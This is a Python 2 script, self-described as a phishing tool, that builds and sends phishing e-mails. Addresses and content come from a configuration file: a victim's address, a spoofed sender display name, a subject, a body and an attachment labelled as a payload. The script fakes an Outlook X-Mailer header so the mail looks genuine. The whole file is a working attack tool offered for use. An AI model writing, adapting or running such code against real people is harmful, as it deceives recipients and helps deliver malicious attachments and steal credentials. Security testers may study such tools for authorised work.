"""
Bin3xPhisher: A python script that drafts an e-mail to perform phishing attacks.
"""
import sys
import socket
import os
import getopt
import time
import datetime
import smtplib
from email import utils, message, mime, encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ssl
import ConfigParser
import re
import subprocess
import getpass


# Usage Information
# Exits
def usage():
    os.system("clear")
    print "JAGed Phishing Tool v.01"
    print "phish.py [options]"
    print "-v Verbose Logging"
    print "-H Help"
    print "-C Configuration File"
    print
    print "Usage Requires A Valid Configuration File"
    print "[header]"
    print "SMTP=<IP Address or Domain of SMPT Server>"
    print "FQDN=<domain.com>"
    print "TLS=<True/False>"
    print "toAddress=victim@victimINC.com"
    print "fromAddress=noreply@domain.com"
    print "fromField=<what to display in from field>"
    print "subject=Subject of E-mail"
    print "attachments=file with payload"
    print "body=file with content of the e-mail"
    print "login=<True/False> \r\n"
    print "[*] Not all fields works with each mail server.  For example Google doesn't allow you to change the from field to anything other than the login name.\r\n"
    print
    sys.exit(0)

class phishMail: 
    """Email class with instances populated by the configuration and associated files"""
    def __init__(self): 
        self.FQDN = None 
        self.SMTP = None 
        self.login = False
        self.toAddress = None 
        self.fromAddress = None 
        self.attachments = None 
        self.subject = None 
        self.body = None 
        self.bodyContent = None 
        self.port = 25
        self.TLS = None
        self.msg = MIMEMultipart()
        self.attachMime = MIMEBase('application', "octet-stream")
        self.smtp = None
        self.verbose = False
        self.config = "JAGedPhisher.conf"
        self.test = False
        self.fromField = None

    def init_config(self):
        """Populated the e-mail instance with the configuration and associated files"""
        config = ConfigParser.ConfigParser()
        try:
            config.read(self.config)

            self.SMTP = config.get('header', 'SMTP')
            self.FQDN =   config.get('header', 'FQDN')
            if config.get('header', 'TLS').lower() in ['true','yes']:
                self.TLS = True 
            self.toAddress =  config.get('header', 'toAddress')
            self.fromAddress = config.get('header', 'fromAddress')
            self.attachments = config.get('header', 'attachments')
            self.subject = config.get('header', 'subject')
            self.body = config.get('header', 'body')
            if self.TLS == True:
                #self.port = 465
                self.port = 587     
            if config.has_option('header', 'port'):
                self.port = config.get('header', 'port')
            if config.has_option('header', 'fromField'):
                self.fromField = config.get('header', 'fromField')
            if config.has_option('header','login'):
                if config.get('header', 'login').lower() in ['true','yes']:
                    self.login = True
            self.SMTPaddress = socket.gethostbyname(self.SMTP)
            self.smtp = smtplib.SMTP(self.SMTPaddress,self.port)                     
            if self.verbose:
                self.smtp.set_debuglevel(True)  
            fp = open(self.body, 'rb')
            self.bodyContent = fp.read()
            fp.close()
            if self.attachments:
                fp2 = open(self.attachments,'rb')
                self.attachMime.set_payload(fp2.read())
                encoders.encode_base64(self.attachMime)
                self.attachMime.add_header('Content-Disposition', 'attachment; filename="' + os.path.basename(self.attachments) + '"')
                fp2.close()
        except (socket.error, smtplib.SMTPException) as exc:
            print '[*] Could not connect to SMTP Server' + '\r\n' + str(exc) +'\r\n' 
            usage()
        except ConfigParser.Error:
            print '[*] Configuration file incorrect \r\n'
            usage()
        except (OSError, IOError) as exc:
            print '[*] The file containing the config, body, or attachments was not found \r\n' + str(exc) + '\r\n'
            usage()
        except Exception as exc:
            print exc
            usage()


    def __str__(self):
        """Override the print method"""
        data = "[*] Preview Message to %s:%d from %s\r\n" % (self.SMTP,int(self.port),self.FQDN)
        if self.TLS:
            data +=  "[*] TLS enabled\r\n"
        data +=  "\r\n"
        if self.fromField:
             data +=   "From: " + self.fromField + "\r\n"
        else:
             data +=   "From: " + self.fromAddress + "\r\n"
        data += "To: " + self.toAddress + "\r\n"
        data +=  "Subject: " + self.subject + "\r\n"
        if self.attachments:
            data += "Attachment: " + self.attachments + "\r\n"
        else:
            data += "No Attachment" + "\r\n"
        data +=  "\r\n"
        data += self.bodyContent + "\r\n\r\n"
        return data

    # Establishes the connection
    # Returns: socket.socket object
    def SMTP_connect(self):
        """Establish SMTP connection"""
        try: 
            self.smtp.ehlo()
            if self.TLS:
                self.smtp.starttls()
                self.smtp.ehlo()
            if self.login:
                password = getpass.getpass('Please enter your e-mail password: \r\n')
                self.smtp.login(self.fromAddress, password)
            self.SMTPaddress = socket.gethostbyname(self.SMTP)
            print "[*] Connected to %s:%d" % (self.SMTPaddress,int(self.port))
        except smtplib.SMTPException as exc:
            if self.login == True:
                print '[*] Could not connect or login to the SMTP Server' + '\r\n' + exc
            else:
                print '[*] Could not connect to the SMTP Server'
        except ssl.SSLError as exc: 
            print 'Could not connect to socket due to SSL error. \r\n' + exc
            usage()
        
    # Builds an e-mail
    # Returns: The string of a Message() or MIMEMultipart()
    def build_email(self):
        """Builds the e-mail to send over SMTP"""
        if self.attachments:
            m1=MIMEMultipart()
        else:
            m1=Message()
        if self.fromField:
            m1['From'] = self.fromField
        else:
            m1['From'] = self.fromAddress
        m1['To'] = self.toAddress
        m1['Subject'] = self.subject
        m1['X-Mailer'] = "Microsoft Outlook 16.0"
        m1['Message-ID'] = utils.make_msgid().split('@')[0] + self.FQDN
        m1['Date'] = utils.formatdate(localtime =1)
       
        html = """\
        <html>
            <head></head>
            <body>
                <p>"""
        html += self.bodyContent + "</p></body></html>"
        html = MIMEText(html,'html')
        plain = MIMEText(self.bodyContent,'plain')
        m1.attach(plain)
        m1.attach(html)
        m1.attach(self.attachMime)
       
        if self.verbose == True:
            print m1.as_string()
        return m1.as_string()


def main(): 
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hvtc:", ["help", "verbose","test","config"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    phEmail = phishMail()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        if o in ("-v","--verbose"):
            phEmail.verbose = True
        if o in ("-c", "--config"):
            phEmail.config = a
        if o in ("-t","--test"):
            phEmail.test = True

    phEmail.init_config()

    #Print e-mail to confirm it is correct
    os.system("clear")
    print phEmail
    correct = raw_input("Is this information correct? (y/n) >> ")
    correct = correct.lower()
    if correct == "y":
        os.system("clear")
    else:
        usage()

    #Connect to Server
    phEmail.SMTP_connect()
   
    #Build the e-mail and sld the e-mail and send it and close
    data = phEmail.build_email()
  
    tolist = phEmail.toAddress.split(",")
    phEmail.smtp.sendmail(phEmail.fromAddress, tolist, data)
    print '[*] E-Mail Sent'
    phEmail.smtp.close()
    print '[*] Connection Closed'
  

if __name__ == "__main__":
    main()
